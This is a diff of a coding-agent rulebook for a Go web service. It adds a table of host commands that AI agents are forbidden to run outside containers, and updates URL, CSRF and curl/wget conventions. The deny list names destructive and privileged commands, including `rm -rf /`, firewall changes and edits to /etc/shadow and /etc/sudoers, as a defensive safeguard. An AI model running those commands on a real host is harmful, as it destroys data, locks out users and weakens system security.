+This rule applies to **all** AI activity — implementation, testing, debugging, reproducing bugs, audits, and exploratory shell sessions. There is no testing or debugging exemption.
+
+**Forbidden on the host (allowed only inside an isolated guest):**
+
+| Category | Example Commands | Why Forbidden on Host |
+|----------|-----------------|----------------------|
+| **Power / lifecycle** | `reboot`, `shutdown`, `poweroff`, `halt`, `init 0`, `init 6`, `systemctl reboot`, `systemctl poweroff`, `loginctl reboot` | Disconnects user, loses unsaved work, may interrupt other users |
+| **Service control (host)** | `systemctl start/stop/restart/enable/disable {host-service}`, `service {x} restart`, `rc-service`, `launchctl load/unload`, `sc.exe stop/start` | Affects services outside project scope |
+| **Network configuration** | `ip link set ... up/down`, `ip addr add/del`, `ip route add/del`, `ifconfig`, `ifup`/`ifdown`, `nmcli`, `networkctl`, `wg-quick`, `route add/del`, `netsh interface` | Can cut network access, break SSH session, kill VPN |
+| **Firewall / packet filter** | `iptables`, `ip6tables`, `nft`, `ufw`, `firewall-cmd`, `pfctl`, `netsh advfirewall` | Can lock out remote access, expose services |
+| **Kernel / modules** | `modprobe`, `rmmod`, `insmod`, `sysctl -w` (persistent), writes to `/proc/sys/`, `/sys/`, kernel param changes | System-wide kernel state |
+| **Disk / mount / filesystem** | `mount`, `umount`, `mkfs.*`, `fdisk`, `parted`, `mkswap`, `swapon`, `swapoff`, `cryptsetup`, `lvcreate`, `vgremove`, `zpool`, `zfs create/destroy` | Can corrupt data, lose volumes |
+| **User / group / auth** | `useradd`, `userdel`, `usermod`, `groupadd`, `groupdel`, `passwd {other-user}`, `chage`, `visudo`, edits to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d/*` | Privilege escalation, lockout risk |
+| **Package management (host)** | `apt`/`apt-get install/remove/upgrade`, `dnf`/`yum install/remove`, `pacman -S/-R/-Syu`, `apk add/del`, `brew install/uninstall`, `pip install --user`/`--system`, `npm install -g`, `cargo install` | Pollutes host, may downgrade libs |
+| **Time / clock** | `date -s`, `timedatectl set-time`, `hwclock --systohc`, `ntpdate` | Breaks TLS, breaks logs, breaks scheduled jobs |
+| **System config files** | Edits to `/etc/fstab`, `/etc/hosts`, `/etc/resolv.conf`, `/etc/network/*`, `/etc/systemd/system/*`, `/etc/ssh/sshd_config`, `/boot/*`, `/etc/grub*` | Persistent host changes, boot/network risk |
+| **Destructive process / container ops** | (See "Process Management" / FORBIDDEN Commands list — `pkill`, `killall`, `docker system prune`, `rm -rf /`, etc.) | Already covered, never override |
+
+**ALLOWED on the host (read-only or scope-limited inspection):**
+
+| Allowed | Example |
+|---------|---------|
+| Read-only inspection | `ip addr show`, `ip route show`, `ss -tlnp`, `systemctl status {x}`, `iptables -L -n`, `mount` (no args), `lsblk`, `df`, `free`, `ps`, `pgrep -la`, `journalctl --no-pager` |
+| Project-scoped temp files | `/tmp/apimgr/{internal_name}-XXXXXX/` (see Temporary Directory Structure) |
+| Project-scoped processes | Kill ONE PID belonging to this project (see Process Management) |
+| Container/VM orchestration | `docker run`, `docker stop {project-container}`, `incus launch`, `incus delete test-weather`, `podman run` |
+
+**Allowed Contexts (commands forbidden on host ARE allowed inside these):**
+
+| Context | Detection / Invocation Pattern | Notes |
+|---------|-------------------------------|-------|
+| **Docker container** | `docker run --rm ...`, `docker exec {container} ...` | Ephemeral or named project container only |
+| **Podman container** | `podman run --rm ...`, `podman exec {container} ...` | Same rules as Docker |
+| **Incus / LXC / LXD** | `incus exec {instance} -- ...`, `lxc exec {instance} -- ...` | Preferred for systemd/network testing |
+| **VM (QEMU/KVM/libvirt)** | `virsh ... `, `qemu-system-* ...`, ssh into VM you launched | Must be a VM the AI launched or a clearly disposable test VM |
+| **chroot** | `chroot /path/to/rootfs ...`, `unshare --root=...` | Treat as guest if rootfs is a project temp dir |
+| **Network namespace** | `ip netns exec {ns} ...` | Network commands scoped to that namespace only |
+| **Vagrant / multipass** | `vagrant ssh -c "..."`, `multipass exec {vm} -- ...` | Disposable dev VMs |
+| **CI runner ephemeral** | Inside a CI job where the runner is destroyed after the job | The runner *is* the disposable guest |
+
+**How AI MUST decide before running a forbidden command:**
+
+```
+1. Is the command in the "Forbidden on the host" list?
+   → NO  : run it (subject to other rules — Process Management, etc.)
+   → YES : continue to step 2
+
+2. Am I about to invoke it via an "Allowed Contexts" wrapper?
+   (docker exec, incus exec, ssh into VM I launched, chroot into temp rootfs, etc.)
+   → NO  : REFUSE. Tell the user what command was needed and why running it on
+           the host is unsafe. Offer to run it inside a container/VM instead.
+   → YES : continue to step 3
+
+3. Is the guest disposable / project-owned?
+   (just-launched test container, project temp rootfs, ephemeral CI runner)
+   → NO  : ASK the user before proceeding (a long-running guest is closer to
+           a host than a test container).
+   → YES : run it.
+```
+
+**When in doubt → treat the environment as the host and refuse.** A wrong "I think I'm in a container" decision can take down a workstation, a CI runner, or a coworker's session.
+
+**Container/VM invocation MUST be fully and explicitly scoped — no shortcuts:**
+
+| WRONG (ambiguous / leaks to host) | RIGHT (explicit guest scope) |
+|------------------------------------|------------------------------|
+| `systemctl restart weather` | `incus exec test-weather -- systemctl restart weather` |
+| `iptables -A INPUT -p tcp --dport 80 -j ACCEPT` | `docker run --rm --cap-add=NET_ADMIN alpine iptables -A INPUT ...` |
+| `apt-get install -y curl` | `docker exec {container} apt-get install -y curl` (and only inside disposable container) |
+| `mount /dev/loop0 /mnt` | `incus exec {instance} -- mount /dev/loop0 /mnt` |
+| `reboot` | `incus restart test-weather` (project test instance only) |
+| Plain `bash -c "systemctl ..."` (host shell) | `incus exec test-weather -- bash -c "systemctl ..."` |
+
+**Detecting the current execution context (use before any forbidden command):**
+
+| Signal | Means | How to Check |
+|--------|-------|--------------|
+| `/.dockerenv` exists | Inside Docker | `test -f /.dockerenv` |
+| `/run/.containerenv` exists | Inside Podman | `test -f /run/.containerenv` |
+| `/proc/1/cgroup` contains `docker`/`lxc`/`kubepods` | Inside container | `grep -E 'docker|lxc|kubepods' /proc/1/cgroup` |
+| `systemd-detect-virt` returns non-`none` | Inside VM or container | `systemd-detect-virt` |
+| `$container` env var set (`lxc`, `docker`, `podman`) | Inside that runtime | `echo "$container"` |
+| `hostname` matches `test-weather` pattern | Project test guest | Pattern match |
+
+**If detection is unavailable or ambiguous → assume HOST → refuse forbidden commands.**
+
+**Scope boundaries — these rules apply during:**
+
+- ✅ Implementation work
+- ✅ Writing or running tests (unit, integration, E2E)
+- ✅ Debugging, reproducing bugs, "just trying something"
+- ✅ Audits, exploration, "let me check the network config"
+- ✅ Following user instructions ("can you restart the service?" → ask which service, where, and refuse if it's a host service)
+
+**Required behavior on refusal:**
+
+```
+I can't run `{command}` on the host because it would {reboot the system / change
+host networking / modify host services / etc.}.
+
+I can run it inside a {Docker container / Incus instance / VM} if you'd like —
+that would look like:
+
+    {explicit guest-scoped invocation}
+
+Want me to do that instead, or did you mean to target a specific container/VM?
+```
+
+**Cross-references:**
+- "Process Management" → FORBIDDEN Commands (process/container destruction rules)
+- "Container Usage" → ALL builds, tests, and binary execution MUST use containers
+- "NEVER Use Project Directory for Testing" → temp directory rules
+- "AI Docker Compose Rules" → which compose files AI may use
+
+**This rule is NON-NEGOTIABLE. There is no testing-mode, debugging-mode, or "just-this-once" exemption. If a task genuinely requires a host change, AI MUST stop and ask the user to perform it themselves.**
 
 ### Translation Rule (ALL Code Changes)
 
@@ -2757,16 +2993,16 @@ Spec version: {line count or hash}
 
 1. Download it first using curl:
    ```bash
-   curl -q -LSsf -o {tmp_dir}/apimgr/weather/screenshot_XXXX.png {url}
+   curl -q -LSsf -o {tmp_dir}/apimgr/{internal_name}/screenshot_XXXX.png {url}
    ```
 2. Then view the downloaded local file using the Read tool
 
 | Step | Command |
 |------|---------|
-| Download | `curl -q -LSsf -o {tmp_dir}/apimgr/weather/screenshot_XXXX.png {url}` |
+| Download | `curl -q -LSsf -o {tmp_dir}/apimgr/{internal_name}/screenshot_XXXX.png {url}` |
 | View | Use Read tool on the downloaded file |
 
-**Path format:** `{tmp_dir}/apimgr/weather/screenshot_XXXX` where `XXXX` is an incremental number (0001, 0002, etc.)
+**Path format:** `{tmp_dir}/apimgr/{internal_name}/screenshot_XXXX` where `XXXX` is an incremental number (0001, 0002, etc.)
 
 **Why:** Remote URLs may require authentication, have rate limits, or change. Downloading first ensures the image is captured and can be re-examined without re-fetching.
 
@@ -2774,7 +3010,7 @@ Spec version: {line count or hash}
 
 | Action | Reason |
 |--------|--------|
-| **Modifying PARTS 0-36** | **Implementation patterns are fixed - NEVER modify** |
+| **Modifying PARTS 0-37** | **Implementation patterns are fixed - NEVER modify** |
 | `git add` | AI cannot stage files - write COMMIT_MESS instead |
 | `git commit` | AI cannot commit - write COMMIT_MESS instead |
 | `git push` | AI cannot push - user must do this |
@@ -2992,7 +3228,7 @@ When the specification is unclear:
 | **CI/CD workflows** | GitHub/Gitea/Jenkins pipeline structure |
 | **Directory layout** | `src/`, `docker/`, `binaries/`, etc. |
 | **Config file format** | YAML structure, standard keys |
-| **Health endpoints** | `/healthz`, `/api/v1/healthz` format |
+| **Health endpoints** | `/healthz`, `/api/{api_version}/healthz` format |
 | **API response format** | JSON structure, error format, pagination |
 
 ### What Projects CAN Customize
@@ -3002,7 +3238,7 @@ When the specification is unclear:
 | **Dockerfile packages** | Add packages app needs | `RUN apk add --no-cache ffmpeg` |
 | **Base image** | Change if app requires | `debian:latest` instead of `alpine` |
 | **Config values** | App-specific settings | `search.engines`, `jokes.categories` |
-| **Routes** | App-specific endpoints | `/api/v1/search`, `/api/v1/jokes` |
+| **Routes** | App-specific endpoints | `/api/{api_version}/search`, `/api/{api_version}/jokes` |
 | **Database schema** | App-specific tables | `searches`, `jokes`, `engines` |
 | **Business logic** | App's core functionality | Search algorithms, joke selection |
 | **UI/branding** | App-specific styling | Colors, logos, page content |
@@ -3739,15 +3975,15 @@ Every feature MUST work via:
 **Endpoint Pattern (applies to ENTIRE app):**
 | Web Route (HTML) | API Route (JSON) | Purpose |
 |------------------|------------------|---------|
-| `/` | `/api/v1/` | Homepage / API root |
-| `/healthz` | `/api/v1/healthz` | Health status (both exist independently) |
-| `/admin/dashboard` | `/api/v1/admin/dashboard` | Admin dashboard |
-| `/admin/server/settings` | `/api/v1/admin/server/settings` | Server settings |
-| `/admin/users` | `/api/v1/admin/users` | User management |
-| `/quotes` | `/api/v1/quotes` | Project feature (example) |
-| `/quotes/random` | `/api/v1/quotes/random` | Project feature (example) |
-| `/openapi` | `/openapi.json` | API documentation (root-level, not /api/v1/) |
-| `/graphql` | `/api/v1/graphql` | GraphQL endpoint |
+| `/` | `/api/{api_version}/` | Homepage / API root |
+| `/healthz` | `/api/{api_version}/healthz` | Health status (both exist independently) |
+| `/{admin_path}/dashboard` | `/api/{api_version}/{admin_path}/dashboard` | Admin dashboard |
+| `/{admin_path}/server/settings` | `/api/{api_version}/{admin_path}/server/settings` | Server settings |
+| `/{admin_path}/users` | `/api/{api_version}/{admin_path}/users` | User management |
+| `/quotes` | `/api/{api_version}/quotes` | Project feature (example) |
+| `/quotes/random` | `/api/{api_version}/quotes/random` | Project feature (example) |
+| `/server/docs/swagger` | `/api/{api_version}/openapi.json` (and `/api/openapi.json` for current) | API documentation — UI is frontend, spec is API |
+| `/server/docs/graphql` | `/api/{api_version}/graphql` (and `/api/graphql` for current) | GraphQL — GraphiQL is frontend, endpoint is API |
 
 **This pattern applies to ALL features:**
 - Every admin page has a corresponding admin API
@@ -3796,7 +4032,7 @@ When working on this project, the following roles are assumed based on the task:
 
 ```bash
 # CORRECT - Use Makefile targets
-make dev                    # Quick build to {tempdir}/apimgr/weather-XXXXXX/
+make dev                    # Quick build to {temp_dir}/apimgr/{internal_name}-XXXXXX/
 make local                   # Build with version info to binaries/
 make build                  # Full cross-platform build to binaries/
 make test                   # Run unit tests
@@ -3871,7 +4107,7 @@ db.Query("SELECT * FROM users WHERE email = '" + email + "'")
 |-------------|------------|
 | **SQL Injection** | Parameterized queries ONLY - never string concatenation |
 | **XSS** | HTML-escape all user content, CSP headers |
-| **CSRF** | CSRF tokens for all state-changing forms |
+| **CSRF** | Tokens on cookie-authenticated browser forms (state-changing methods). Bypassed for Bearer/API-token requests, public endpoints, and explicit exempt paths (OAuth callbacks, webhooks). See PART 16 → "CSRF Protection". |
 | **Command Injection** | Never shell out with user input, use libraries |
 | **Path Traversal** | Validate paths, use `filepath.Clean()`, reject `..` |
 | **Enumeration** | Consistent timing, vague auth errors, rate limiting |
@@ -3941,11 +4177,13 @@ db.Query("SELECT * FROM users WHERE email = '" + email + "'")
 **User Response (API):**
 ```json
 {
-  "error": "Service temporarily unavailable",
-  "code": "SERVICE_ERROR",
-  "retry_after": 30
+  "ok": false,
+  "error": "SERVICE_ERROR",
+  "message": "Service temporarily unavailable",
+  "details": { "retry_after_seconds": 30 }
 }
 ```
+HTTP status: `503` with `Retry-After: 30` header.
 
 **Never reveal to users:**
 - Whether a username/email exists (use "If account exists, email sent")
@@ -4245,13 +4483,13 @@ Detect platform by checking for workflow files in this order:
 
 ```markdown
 # GitHub Actions
-[![Build](https://github.com/apimgr/weather/actions/workflows/build.yml/badge.svg)](https://github.com/apimgr/weather/actions/workflows/build.yml)
+[![Build](https://github.com/apimgr/{internal_name}/actions/workflows/build.yml/badge.svg)](https://github.com/apimgr/{internal_name}/actions/workflows/build.yml)
 
 # Gitea/Forgejo Actions
-[![Build](https://git.example.com/apimgr/weather/actions/workflows/build.yml/badge.svg)](https://git.example.com/apimgr/weather/actions)
+[![Build](https://git.example.com/apimgr/{internal_name}/actions/workflows/build.yml/badge.svg)](https://git.example.com/apimgr/{internal_name}/actions)
 
 # GitLab CI
-[![Build](https://gitlab.com/apimgr/weather/badges/main/pipeline.svg)](https://gitlab.com/apimgr/weather/-/pipelines)
+[![Build](https://gitlab.com/apimgr/{internal_name}/badges/main/pipeline.svg)](https://gitlab.com/apimgr/{internal_name}/-/pipelines)
 
 # Jenkins
 [![Build](https://jenkins.example.com/buildStatus/icon?job=apimgr/weather)](https://jenkins.example.com/job/apimgr/job/weather/)
@@ -4261,18 +4499,18 @@ Detect platform by checking for workflow files in this order:
 
 ```markdown
 # GitHub
-[![Release](https://img.shields.io/github/v/release/apimgr/weather)](https://github.com/apimgr/weather/releases)
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![Release](https://img.shields.io/github/v/release/apimgr/{internal_name})](https://github.com/apimgr/{internal_name}/releases)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 [![Docs](https://readthedocs.org/projects/{RTD_PROJECT}/badge/?version=latest)](https://{RTD_URL})
 
 # GitLab
-[![Release](https://gitlab.com/apimgr/weather/-/badges/release.svg)](https://gitlab.com/apimgr/weather/-/releases)
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![Release](https://gitlab.com/apimgr/{internal_name}/-/badges/release.svg)](https://gitlab.com/apimgr/{internal_name}/-/releases)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 [![Docs](https://readthedocs.org/projects/{RTD_PROJECT}/badge/?version=latest)](https://{RTD_URL})
 
 # Gitea/Forgejo (use shields.io with custom endpoint or static badge)
-[![Release](https://img.shields.io/badge/dynamic/json?url=https://git.example.com/api/v1/repos/apimgr/weather/releases/latest&query=$.tag_name&label=release)](https://git.example.com/apimgr/weather/releases)
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![Release](https://img.shields.io/badge/dynamic/json?url=https://git.example.com/api/{api_version}/repos/apimgr/{internal_name}/releases/latest&query=$.tag_name&label=release)](https://git.example.com/apimgr/{internal_name}/releases)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 [![Docs](https://readthedocs.org/projects/{RTD_PROJECT}/badge/?version=latest)](https://{RTD_URL})
 
 # {RTD_PROJECT} and {RTD_URL} - Use one of:
@@ -4289,7 +4527,7 @@ Detect platform by checking for workflow files in this order:
 
 ```markdown
 # ✅ CORRECT - GitHub can detect license
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 
 # ❌ WRONG - Static badge, GitHub cannot detect
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE.md)
@@ -4302,7 +4540,7 @@ Detect platform by checking for workflow files in this order:
 
 **Verify detection:**
 - Go to repo page → Look at right sidebar → Should show "MIT License" (not just "View license")
-- API check: `curl -q -LSsf https://api.github.com/repos/apimgr/weather/license`
+- API check: `curl -q -LSsf https://api.github.com/repos/apimgr/{internal_name}/license`
 
 #### Docs Badge - Avoid "unknown"
 
@@ -4404,11 +4642,11 @@ By using this software, you acknowledge that you have read and understood this d
 | Context | URL Format | Example |
 |---------|------------|---------|
 | **Documentation** (README, docs/, examples) | `https://wthr.top/path` | `GET https://api.example.com/healthz` |
-| **Embedded code** (Go, JS, templates) | `wthr.top/path` | `fmt.Sprintf("https://%s/healthz", cfg.FQDN)` |
+| **Embedded code** (Go, JS, templates) | Request-derived `{proto}://{fqdn}:{port}/path` via `BuildURL(r, "/path")` | `BuildURL(r, "/healthz")` |
 
 **Why the distinction:**
 - **Documentation**: Users copy-paste. Full URLs work immediately.
-- **Embedded code**: Must use configured FQDN variable for the running instance.
+- **Embedded code**: Must derive `{proto}`, `{fqdn}`, `{port}` from the *current request* (handles reverse proxies, multi-domain, http-vs-https). NEVER hardcode `https://` + `cfg.FQDN`. See PART 12 → "Resolution Order (Reverse Proxy Preferred)".
 
 ---
 
@@ -4438,7 +4676,7 @@ If `https://wthr.top` is defined, ALL documentation examples MUST use the full U
 GET /healthz
 GET /api/v1/users
 GET /api/autoconfig
-curl http://localhost:8080/api/v1/data
+curl http://localhost:64580/api/v1/data
 
 # ✅ CORRECT - Full URLs using officialsite
 GET https://api.example.com/healthz
@@ -4487,17 +4725,17 @@ curl -q -LSsf https://wthr.top/api/autoconfig
 
 ---
 
-**wthr.top - Embedded Code URLs (Go, JavaScript, templates)**
+**Embedded Code URLs (Go, JavaScript, templates) — Request-Derived**
 
-For code that runs in the application, NEVER use bare `/path`. Always use `wthr.top/path`.
+For code that runs in the application, NEVER use bare `/path` for outbound URLs (emails, OAuth callbacks, webhooks, HATEOAS, etc.). Always derive the full URL from the *current request* via `BuildURL(r, "/path")` so reverse-proxy headers, the actual proto, and any non-standard port are honored. NEVER hardcode `https://` + `cfg.FQDN` — that breaks behind reverse proxies, on http-only deployments, on non-standard ports, and on multi-domain installs.
 
 | Context | ❌ Wrong | ✅ Correct |
 |---------|----------|------------|
-| **Go code** | `"/api/v1/users"` | `fmt.Sprintf("https://%s/api/v1/users", cfg.FQDN)` |
-| **JavaScript** | `fetch('/api/v1/users')` | `fetch(\`${window.location.origin}/api/v1/users\`)` |
-| **HTML templates** | `href="/api/docs"` | `href="https://{{.FQDN}}/api/docs"` |
-| **Config files** | `url: /callback` | `url: https://wthr.top/callback` |
-| **Email templates** | `<a href="/verify">` | `<a href="https://{{.FQDN}}/verify">` |
+| **Go code** | `"/api/{api_version}/users"` (bare) OR `fmt.Sprintf("https://%s/api/{api_version}/users", cfg.FQDN)` (hardcoded proto, no port) | `BuildURL(r, "/api/{api_version}/users")` |
+| **JavaScript** | `fetch('/api/{api_version}/users')` (bare — breaks with `{base_url}` prefix) | `fetch(\`${window.location.origin}/api/{api_version}/users\`)` |
+| **HTML templates** | `href="/api/docs"` (bare) OR `href="https://{{.FQDN}}/api/docs"` (hardcoded proto, no port) | Pass URL in: `{ "DocsURL": BuildURL(r, "/api/docs") }`, template uses `href="{{.DocsURL}}"` |
+| **Config files** | `url: /callback` (bare — config can't see request) | Compute at request time and inject: read `url_path` from config, then `BuildURL(r, cfg.CallbackPath)` |
+| **Email templates** | `<a href="/verify">` (bare) OR `<a href="https://{{.FQDN}}/verify">` (hardcoded proto, no port) | Pass URL in: `{ "VerifyURL": BuildURL(r, "/verify?token=...") }`, template uses `<a href="{{.VerifyURL}}">` |
 
 **Why:** Bare paths break when:
 - Behind reverse proxy with different base path
@@ -4513,16 +4751,19 @@ For code that runs in the application, NEVER use bare `/path`. Always use `wthr.
 redirectURL := "/auth/callback"
 link := "/api/v1/users/" + userID
 
-// ✅ CORRECT - Using FQDN
+// ❌ WRONG - Hardcoded proto + missing port handling
+//   (ignores reverse-proxy headers, breaks on non-standard ports, breaks on http-only deployments)
 redirectURL := fmt.Sprintf("https://%s/auth/callback", cfg.FQDN)
 link := fmt.Sprintf("https://%s/api/v1/users/%s", cfg.FQDN, userID)
 
-// ✅ CORRECT - Helper function
-func BuildURL(path string) string {
-    return fmt.Sprintf("https://%s%s", cfg.FQDN, path)
-}
-link := BuildURL("/api/v1/users/" + userID)
+// ✅ CORRECT - Use the canonical BuildURL helper (defined in PART 12 — "URL Display Rules")
+//   It detects proto/fqdn/port from the *http.Request, honors X-Forwarded-* headers,
+//   and strips :80/:443 automatically.
+redirectURL := BuildURL(r, "/auth/callback")
+link := BuildURL(r, "/api/{api_version}/users/" + userID)
 ```
+
+**Why pass `*http.Request` instead of reading `cfg.FQDN`:** the binary lives behind reverse proxies, may serve multiple FQDNs, and may be reached over http or https depending on deployment. The correct values for `{proto}`, `{fqdn}`, and `{port}` live in the *current request's* headers — not in static config. See PART 12 → "Resolution Order (Reverse Proxy Preferred)" for the full priority chain. NEVER construct an outbound URL from `cfg.FQDN` + a hardcoded scheme.
 
 **JavaScript examples:**
 
@@ -4560,9 +4801,9 @@ router.GET("/healthz", handleHealth)
 |----------|--------|---------|
 | README.md | `https://wthr.top/path` | `GET https://api.example.com/healthz` |
 | docs/*.md | `https://wthr.top/path` | `curl -q -LSsf https://api.example.com/api/v1/users` |
-| Go code | `wthr.top/path` | `fmt.Sprintf("https://%s/path", cfg.FQDN)` |
-| JS code | `origin/path` | `${window.location.origin}/path` |
-| Email templates | `wthr.top/path` | `https://{{.FQDN}}/verify` |
+| Go code | Request-derived via `BuildURL(r, "/path")` | `BuildURL(r, "/path")` |
+| JS code | `origin/path` (browser already knows current origin) | `${window.location.origin}/path` |
+| Email templates | Request-derived; pass the URL into the template, do NOT compute it inside the template | template input: `{ "VerifyURL": BuildURL(r, "/verify?token=...") }`; template body: `{{.VerifyURL}}` |
 | Router registration | `/path` | `router.GET("/api/v1/users", ...)` (internal only) |
 
 **Platform-Specific URLs:**
@@ -4583,7 +4824,7 @@ router.GET("/healthz", handleHealth)
 
 {PLATFORM_BUILD_BADGE}
 {PLATFORM_RELEASE_BADGE}
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 {PLATFORM_DOCS_BADGE}  <!-- Only include if docs are deployed -->
 
 ## About
@@ -4610,7 +4851,7 @@ docker run -d \
   -p 64580:80 \
   -v ./rootfs/config:/config:z \
   -v ./rootfs/data:/data:z \
-  {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+  {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
 ```
 
 ### Docker Compose
@@ -4647,7 +4888,7 @@ sudo mv weather-cli-linux-amd64 /usr/local/bin/weather-cli
 ### Configure
 
 ```bash
-# Connect to official server (creates ~/.config/apimgr/weather/cli.yml)
+# Connect to official server (creates ~/.config/apimgr/{internal_name}/cli.yml)
 weather-cli --server https://wthr.top --token YOUR_API_TOKEN
 ```
 
@@ -4660,7 +4901,7 @@ weather-cli [command] --help
 
 ## Configuration
 
-Configuration is auto-generated on first run. Edit via admin panel at `{proto}://wthr.top/admin` (admin_path defaults to "admin").
+Configuration is auto-generated on first run. Edit via admin panel at `{proto}://{fqdn}/{admin_path}` (admin_path defaults to "admin").
 
 Key settings:
 - `server.port` - Listen port (default: random 64xxx)
@@ -4668,12 +4909,12 @@ Key settings:
 
 ## API
 
-API documentation available at `https://wthr.top/api/v1/` when running.
+API documentation available at `https://wthr.top/api/{api_version}/` when running.
 
 | Endpoint | Description |
 |----------|-------------|
 | `GET https://wthr.top/healthz` | Health check |
-| `GET https://wthr.top/api/v1/...` | API endpoints |
+| `GET https://wthr.top/api/{api_version}/...` | API endpoints |
 
 ### Examples
 
@@ -4682,7 +4923,7 @@ API documentation available at `https://wthr.top/api/v1/` when running.
 curl -q -LSsf https://wthr.top/healthz
 
 # API request (requires auth)
-curl -q -LSsf -H "Authorization: Bearer TOKEN" https://wthr.top/api/v1/resource
+curl -q -LSsf -H "Authorization: Bearer TOKEN" https://wthr.top/api/{api_version}/resource
 ```
 
 ## Other
@@ -4769,7 +5010,7 @@ curl -q -LSsf {url}
 # With headers only (HEAD request)
 curl -q -LSsfI {url}
 
-# With output to file
+# With output to file (see "Output File Location Rules" below — `{file}` is NOT a bare cwd filename)
 curl -q -LSsf -o {file} {url}
 
 # With custom headers
@@ -4810,13 +5051,18 @@ curl -q -LSsf https://api.example.com/healthz
 curl -q -LSsfI https://api.example.com/healthz
 curl -q -LSsf -H "Accept: application/json" https://api.example.com/users
 curl -q -LSsf -X POST -d '{"name":"test"}' https://api.example.com/users
-curl -q -LSsf -o app.tar.gz https://releases.example.com/app-1.0.tar.gz
-curl -q -LSsf -O https://releases.example.com/app-linux-amd64
+curl -q -LSsf -o /tmp/apimgr/{internal_name}-XXXXXX/app.tar.gz https://releases.example.com/app-1.0.tar.gz   # scratch → tmp
+curl -q -LSsf -o src/data/countries.json https://example.com/countries.json                                    # tracked file → repo path
 
 # ❌ WRONG - Missing standard flags
 curl https://api.example.com/healthz
 curl -s https://api.example.com/healthz
 curl -L https://api.example.com/healthz
+
+# ❌ WRONG - Pollutes project dir / cwd
+curl -q -LSsf -O https://releases.example.com/app-linux-amd64        # -O derives filename in cwd — banned in repo work
+curl -q -LSsf -o app.tar.gz https://...                              # bare filename → cwd — banned for scratch
+curl -q -LSsf -o ./trace.out https://...                             # explicit ./ → cwd — banned for scratch
 ```
 
 **Where this applies:**
@@ -4831,6 +5077,60 @@ curl -L https://api.example.com/healthz
 **Exceptions:**
 - **Interactive debugging** - Use `curl -v` for verbose output
 - **HTTP status code testing** - Use `curl -q -LSs` (no `-f`) when capturing status codes with `-w "%{http_code}"`, since `-f` exits on 4xx/5xx before returning the code
+
+### Output File Location Rules (curl `-o`/`-O`, wget `-O`)
+
+**The project directory MUST stay clean (see PART 3). Downloads MUST go to one of two places, depending on intent:**
+
+| Intent | Destination | Example |
+|--------|-------------|---------|
+| **Scratch / intermediate** (download to inspect, build artifact, profile dump, screenshot, throwaway) | `/tmp/apimgr/{internal_name}-XXXXXX/<file>` (REQUIRED — see PART 3 / PART 0 temp-dir rules) | `curl -q -LSsf -o /tmp/myorg/myapp-X9k2/heap.pprof https://...` |
+| **Tracked project file** (data update, schema pull, vendored asset, embedded JSON refresh) | Specific repo path that is already tracked (or added in the same change) and not gitignored | `curl -q -LSsf -o src/data/countries.json https://example.com/countries.json` |
+
+**Banned regardless of intent:**
+
+| Pattern | Why banned |
+|---------|------------|
+| `curl -O <url>` | Derives filename from URL in cwd → unpredictable, almost always pollutes the project root |
+| `curl -o <bareword> <url>` (e.g., `-o app.tar.gz`) when run from project dir for scratch | Pollutes project dir |
+| `curl -o ./<file>` for scratch | Same — `./` is cwd |
+| `wget <url>` (no `-O`) | Same as `-O` — writes to cwd with derived filename |
+| `wget -O <bareword>` for scratch | Same as curl `-o <bareword>` |
+
+**Decision rule:** before writing `-o`/`-O`, ask:
+1. **Is this file going to be committed?** → Yes: write to its final repo path. No: write to `/tmp/apimgr/{internal_name}-XXXXXX/`.
+2. **Is the file gitignored?** (e.g., `binaries/`) → Treat as scratch unless the gitignored path is the deliberate target (build output going to `binaries/`).
+3. **Are these end-user install instructions in README.md?** → Cwd is acceptable (the user is installing on their own machine, not in the project repo). Still prefer explicit paths and `chmod`/`mv` to system locations.
+
+**Wget flag equivalents to `curl -q -LSsf`:**
+
+| curl | wget | Purpose |
+|------|------|---------|
+| `-q` (don't read `.curlrc`) | `--no-config` (don't read `.wgetrc`) | Predictable behavior across machines |
+| `-L` (follow redirects) | follows by default; `--max-redirect=20` if needed | Handle 301/302 |
+| `-S -s` (silent except errors) | `-nv` (`--no-verbose` — minimal output, errors visible) | Quiet success, loud failure |
+| `-f` (fail on HTTP 4xx/5xx) | built-in since wget 1.12 (exit code 8) | Proper exit code on errors |
+
+**Standard wget invocation:** `wget --no-config -nv -O <path> <url>`
+
+**Examples:**
+
+```bash
+# ✅ CORRECT
+curl -q -LSsf -o /tmp/myorg/myapp-X9k2/release.tar.gz https://...           # scratch
+curl -q -LSsf -o src/data/iso-countries.json https://example.com/iso.json   # tracked refresh
+wget --no-config -nv -O /tmp/myorg/myapp-X9k2/release.tar.gz https://...    # scratch (wget)
+wget --no-config -nv -O docs/openapi-upstream.json https://...              # tracked refresh (wget)
+
+# ❌ WRONG
+curl -O https://example.com/release.tar.gz                                  # -O → cwd
+curl -o release.tar.gz https://...                                          # bare filename → cwd
+curl -o ./release.tar.gz https://...                                        # explicit cwd
+wget https://example.com/release.tar.gz                                     # no -O → cwd
+wget -O release.tar.gz https://...                                          # bare filename → cwd
+```
+
+**Exception (end-user install instructions in README.md / docs/):** Install snippets that the *end user* runs on *their own machine* (not the project repo) MAY write to cwd, since the user is intentionally setting up there. Even so, prefer downloading to `/tmp/` and then `mv` to a system path (`/usr/local/bin/`).
 
 ---
 
@@ -5234,7 +5534,7 @@ echo "3. Commit the changes"
 **Every README.md MUST include a license badge:**
 
 ```markdown
-[![License](https://img.shields.io/github/license/apimgr/weather)](LICENSE.md)
+[![License](https://img.shields.io/github/license/apimgr/{internal_name})](LICENSE.md)
 ```
 
 This badge should appear in the badges section near the top of README.md.
@@ -5332,7 +5632,7 @@ package main
 |----------|-------------|---------|
